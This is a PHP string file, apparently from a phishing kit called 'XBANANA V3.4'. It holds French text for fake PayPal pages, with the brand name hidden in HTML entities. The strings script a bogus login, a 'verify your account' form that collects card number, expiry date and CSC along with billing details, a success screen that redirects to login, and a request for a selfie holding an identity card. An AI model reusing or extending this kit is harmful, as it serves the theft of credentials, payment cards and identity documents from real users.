<?php

/////////// XBANANA V3.4 INDEX LOGIN ///////////////////////////////////////////
$xBanana_01 = "Connectez-vous à votre &#x50;&#x61;&#x79;&#x50;&#x61;&#x6C; compte";
$xBanana_02 = "Email";
$xBanana_03 = "Mot de passe";
$xBanana_04 = "Une adresse email est requise.";
$xBanana_05 = "Un mot de passe est requis.";
$xBanana_06 = "Connexion";
$xBanana_07 = "Vous ne parvenez pas à vous connecter?";
$xBanana_08 = "Inscrivez-vous";
$xBanana_09 = "Confidentialité";
$xBanana_10 = "&#x50;&#x61;&#x79;&#x50;&#x61;&#x6C;";
$xBanana_11 = "Copyright © 1999-".date('Y')." &#x50;&#x61;&#x79;&#x50;&#x61;&#x6C;&#x2E;&#x20;&#x41;&#x6C;&#x6C;&#x20;&#x72;&#x69;&#x67;&#x68;&#x74;&#x73;&#x20;&#x72;&#x65;&#x73;&#x65;&#x72;&#x76;&#x65;&#x64;&#x2E;";
$xBanana_12 = "Vérification de vos informations…";
$xBanana_13 = "Certaines de vos informations ne sont pas correctes. Veuillez réessayer.";
/////////// XBANANA V3.4 INDEX BILLING/CARDING/SUCCESS //////////////////////////////////////////
$xBanana_title         = "&#x50;&#x61;&#x79;&#x50;&#x61;&#x6C; Sécurité & Sûreté";
$xBanana_securityLock = "Votre sécurité est notre priorité absolue";
$xBanana_verify = "Vérifiez votre compte";
$xBanana_pargraphe = "Cher client, veuillez saisir les informations de votre compte et les faire correspondre aux informations de votre carte.";
$xBanana_update_card = "Mettre à jour les informations de la carte";
$xBanana_cardholder = "Nom du titulaire";
$xBanana_cardnumber = "Numéro de carte";
$xBanana_expdate = "Date d'expiration";
$xBanana_csc = "CSC (3 chiffres)";
$xBanana_update_bill = "Mettre à jour l'adresse de facturation";
$xBanana_fullname = "Nom complet légal";
$xBanana_address = "Ligne d'adresse";
$xBanana_city = "Ville";
$xBanana_state = "Pays";
$xBanana_zipCode = "Code postal";
$xBanana_mobile = "Mobile";
$xBanana_home = "Maison";
$xBanana_phoneNumber = "Numéro de téléphone";
$xBanana_agree         = "En cliquant sur Accepter & Continuer, j'ai lu et j'accepte &#x50;&#x61;&#x79;&#x50;&#x61;&#x6C;’s ";
$xBanana_user_agrement = "L'accord de l'utilisateur";
$xBanana_privacy       = "La Politique de confidentialité";
$xBanana_and           = " et ";
$xBanana_policy        = "La Politique de livraison de communications électroniques";
$xBanana_submit        = "Accepter & Continuer";
$xBanana_fPrivacy = "Confidentialité";
$xBanana_flegal = "Légal";
$xBanana_fHelpCenter = "Centre d'aide";
$xBanana_success = "Félicitations!";
$xBanana_successp      = "Cher Client, votre compte &#x50;&#x61;&#x79;&#x50;&#x61;&#x6C; a été mise à jour avec succès. Vous serez redirigé automatiquement vers la page de connexion dans 5 secondes.";
$xBanana_billing = "Informations sur l'adresse de facturation";
$xBanana_carding = "Informations sur la carte";
/////////// XBANANA V3.4 INDEX CONFIRMER L'IDENTITÉ ////////////////////////////////// //////////
$xBanana_id_title = "Confirmez votre identité";
$xBanana_id_parag = "Vos pièces d'identité nous aideront à valider votre identité.";
$xBanana_id_ask = "Que dois-je faire pour confirmer mon identité?";
$xBanana_id_li_1 = "Prenez un selfie en tenant votre carte d'identité ainsi que votre";
$xBanana_id_li_2 = "Le nom du titulaire de la carte d'identité et la carte d'identité doivent correspondre et être clairement visibles.";
$xBanana_id_li_3 = "Votre pièce d'identité doit être à côté de votre visage.";
$xBanana_id_example = "Voici un exemple d'image:";
?>
